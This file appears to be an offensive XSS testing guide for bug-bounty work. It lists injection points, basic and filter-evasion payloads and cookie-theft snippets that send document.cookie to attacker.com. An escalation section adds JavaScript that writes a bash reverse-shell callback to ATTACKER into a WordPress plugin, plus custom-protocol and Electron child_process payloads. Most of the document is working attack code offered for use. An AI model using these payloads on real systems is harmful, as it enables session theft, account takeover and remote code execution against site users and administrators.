> Search by heading for “XSS → RCE” and “Custom protocol → RCE” in the quick matrix. English appendices / polyglot encyclopedic material were removed; rare events and privileged contexts remain.
> **The payloads below are examples to speed up testing, not an exhaustive list.** Choose and adapt them to the live context; test encodings / events / tags that are not listed here as well. Do not limit testing to the few examples collected in this section.

## 1. Existing knowledge base

# XSS Testing Guide

## Identify the XSS type

| Type | Characteristics |
|------|------|
| Stored | The payload is saved in the database and triggers when another user visits |
| Reflected | The payload is in a URL parameter and requires a click to trigger |
| DOM-based | Handled entirely by the front end without passing through the server |

Once confirmed, use `vuln-report-format` for severity; do not raise severity based on whether it is stored / reflected / DOM-based.

---

## Common injection points

```
Search box → search-results page
Comments / message area
Profile (nickname, signature, bio)
Filename (displayed after upload)
404 / error page (displays URL parameters)
Notification content
Customer-support chat
Rich-text editor
README, Wiki, issues, and MR descriptions in Git / documentation sites (test both web and desktop clients; see §8 XSS→RCE)
Desktop-client custom protocols (scheme parameters include url / open / openUrl / webview; see §8 Custom protocol→RCE)
Redirect parameters backUrl / returnUrl / redirect / next (`javascript:` or `javascript%3A` + `document.write(document.cookie)`)
Rich text / BBCode / wiki (`[p]` `[[p]]` `[div]` may preserve attributes when converted to HTML; if the page has Layui/animate.css, use an existing animation class + onanimationstart)
```

---

## Basic payloads

```html
<!-- Basic verification -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- No script tag -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<details open ontoggle=alert(1)>

<!-- Attribute injection (close the attribute) -->
" onmouseover="alert(1)
' onmouseover='alert(1)
"><img src=x onerror=alert(1)>
```

---

## WAF bypass payloads

```html
<!-- Letter case -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=X ONERROR=alert(1)>

<!-- Vary the event -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Rare automatic events: use when onerror/onload are stripped. Unknown tags can work too. In inline scope, cookie refers to document.cookie -->
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<!-- If unknown tags are stripped, switch to input; content-visibility:auto is enough, display:block is unnecessary -->
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
<!-- Popover: use this if style is stripped. A button click is required. In inline scope, URL refers to document.URL -->
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>

<!-- Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<a href="javascript:\u0061lert(1)">click</a>

<!-- Split with an HTML comment -->
<scr<!--comment-->ipt>alert(1)</scr<!--comment-->ipt>

<!-- Use template literals -->
<img src=`x` onerror=alert(1)>
```

---

## Cookie-exfiltration payloads

```html
<!-- Send the Cookie to a server you control -->
<script>
new Image().src="https://attacker.com/steal?c="+encodeURIComponent(document.cookie)
</script>

<!-- fetch version (more reliable) -->
<script>
fetch("https://attacker.com/steal",{method:"POST",body:document.cookie})
</script>

<!-- SRC verification (no real receipt is needed; dnslog is sufficient) -->
<script>
document.write('<img src="http://'+document.cookie.split(';')[0].split('=')[1]+'.your-dnslog.cn">')
</script>
```

---

## Find DOM XSS

```javascript
// Search for dangerous sinks
search_in_sources("innerHTML")
search_in_sources("document.write")
search_in_sources("eval(")
search_in_sources("location.hash")
search_in_sources("location.search")

// Common DOM XSS sources
document.location.hash    // Content after #
document.location.search  // Parameters after ?
document.referrer
window.name
postMessage
```

---

## XSS proof requirements (SRC)

For an SRC report, **do not use alert(1)** as proof of impact. Use:

```javascript
// Prove that the payload can read the Cookie
alert(document.cookie)
// Inline events can use a=alert,a(cookie) or a=alert,a(URL) (the scope resolves these to document.cookie / document.URL)

// Prove that the payload can read the token (localStorage)
alert(localStorage.getItem('token') || sessionStorage.getItem('token'))

// Prove the domain (to show this is not self-XSS)
alert(document.domain)
```

---

### Rare events + inline scope (when onerror/onload are blocked)

The tag name can be arbitrary; unknown elements such as `c2xh` / `c2xl` can work too. Inline event scope can access `document`: `cookie` = `document.cookie`, `URL` = `document.URL`. If `document` / `alert(1)` are blocked, use `a=alert,a(cookie)` or `a=alert,a(URL)`.

No click is needed (when `style` remains available):

```html
<c2xh oncontentvisibilityautostatechange=a=alert,a(cookie) style=display:block;content-visibility:auto>
<input style=content-visibility:auto oncontentvisibilityautostatechange="alert(1)">
```

If unknown tags are stripped, switch to `input` / `p` (or another allowed tag). On `input`, `content-visibility:auto` is often enough; `display:block` is unnecessary. Use `alert(1)` if it passes; if blocked, switch to `a=alert,a(cookie)`.

If rich text / BBCode / wiki converts `[p]`, `[[p]]`, `[div]` into corresponding HTML and preserves attributes, attach the handler directly to an allowed tag:

```
[[p oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto][/p]]
[div onmousemove=eval.call`${'al\x65rt(1)'}` style=position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999][/div]
```

`onmousemove` requires a click / mouse movement; `position:fixed` covers the page so any movement triggers it. `eval.call\`...\`` calls `eval` with a template literal; `\x65` is `e`, avoiding the literal word `alert`. Prefer an automatic event when one works.

If `onerror`/`onload` are stripped and automatic events do not fire, switch to a pointer event and enlarge the element so it triggers as soon as the pointer enters (often URL-encoded):

```
<svg%20id%3dmySvg%20onpointerenter%3da=alert,a(cookie)%20width%3d10000%20height%3d10000></svg>%2F%2F
```

Decoded, this is `<svg id=mySvg onpointerenter=a=alert,a(cookie) width=10000 height=10000></svg>//`. The trailing `//` comments out residue after the injection point. False positives: the pointer never enters the oversized SVG; the tag / event is stripped.

If the page already includes an animation library such as Layui / animate.css, use one of its classes with `onanimationstart` to trigger automatically; there is no need to write your own `@keyframes`:

```
[div class=layui-anim-up onanimationstart=javascript:alert(1)][/div]
```

In an event handler, `javascript:` in `javascript:alert(1)` is a JavaScript label, and the following `alert(1)` still runs; it is not a URL scheme. False positives: the page lacks the CSS; the class / event is stripped; the animation does not run.

False positives: only the tag name changes and attributes are stripped; the result is plain text; there is no mouse movement; stripping `style` leaves a tiny region that requires precise hovering; CSP blocks `eval`. Text such as “Life: face” shown earlier is body content, not part of the payload.

If `style` / `content-visibility` are stripped, switch to Popover; a button click is required. Match `popovertarget` to the `id`; `onbeforetoggle` fires before it opens:

```html
<button popovertarget=x>Click me</button><c2xl onbeforetoggle=a=alert,a(URL) popover id=x>Go</c2xl>
```

Prefer Chrome / Edge. These APIs often do not fire in Firefox or Safari; try another event, and do not consider this approach exhausted. The Popover test is not confirmed unless the button is clicked.

## 8. XSS → RCE / Custom protocols (quick-matrix pointer)

### XSS → RCE (privileged context; an escalation of the Cookie theft chain above)

After confirming stored / reflected XSS, or when Electron itself loads an external page into a privileged window, ask: **which process runs this JavaScript?** A web page gives you a session; it is RCE only when the code reaches a place that can write plugins or call a local bridge. The cases below belong to the same class and are not mutually exclusive.

**Web admin console (WordPress, etc.):** an administrator session + an editor that can modify plugins / themes. Hello Dolly is just a convenient existing file; test any other writable entry point too.

```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

**Desktop client (CEF / Electron / enterprise Git GUI):** if it has a Node bridge / `nodeIntegration` / `enableRemoteModule` / exposed `Buffer`·`require`·`child_process`, page JavaScript runs in a local process. Choose a payload for the observed setup (automatic redirect, external link, event, remote page); **do not copy one gadget blindly**. If the sandbox blocks execution, continue testing the web app as ordinary stored XSS; do not declare this path exhausted.

Delivery 1 (stored XSS): HTML stored in README files, issues, or comments is rendered as a page by the client. If the member / invite endpoint accepts only a numeric `user_id`, enumerate sequential IDs (the existing sequential-ID + bulk-write technique in `idor-test.md`). If clone lists are not isolated, your repository appears in another user client; opening the README triggers the XSS. Adding members is not the core vulnerability; the core issue is the client rendering HTML as privileged XSS.

### Custom protocol → RCE (quick-matrix pointer)

Delivery 2 (custom protocol; stored XSS is not required first): the client registers its own scheme. On macOS, inspect `CFBundleURLSchemes` in `Info.plist`; on Windows, inspect protocol registrations created by the installer. Search bundled JavaScript for `setAsDefaultProtocolClient` / `open-url` / `second-instance`. If protocol parameters include `url`, `urlType`, `open`, `openUrl`, or `webview`, try supplying an external URL. Two common forms follow (use field names observed in the target; do not copy blindly):

- JSON：`scheme://app/open?params={"url":"http://attacker","urlType":1}`
- Flat: `scheme://openUrl?url=http://attacker/exp.html`

Open it from the browser address bar or any `href`; the OS asks whether to open the application. One user click is reasonable interaction; no man-in-the-middle is needed.

The attack page should probe the bridge first, then launch Calculator. Do not stop just because Electron is 18+ or `remote` is absent. Check in this order: `typeof process` → `typeof require` (trust it only if `require.toString()` contains `native`) → `window.require` → if absent, inspect the preload bridge / `window.electron.ipcRenderer`. If `require` can access `child_process` directly, use it; only use the following approach for older windows:

```
const {remote} = require('electron');
remote.require('child_process').exec('open -a Calculator');
```

On Windows, use `calc` as the command. If preload exposes only `ipcRenderer` and cannot invoke commands, the bridge has not been compromised; do not call it RCE.

Confirmed when the local Calculator opens / the specified harmless command executes. If only a browser alert appears, the client does not render the page, the app-open prompt appears without loading the external page, or the page redirects without executing a command, classify it as app launch / stored XSS, not RCE. If the protocol accepts only the application’s own domain and neither `require` nor `remote` is available, stop this delivery path and test Delivery 1 or the web app.
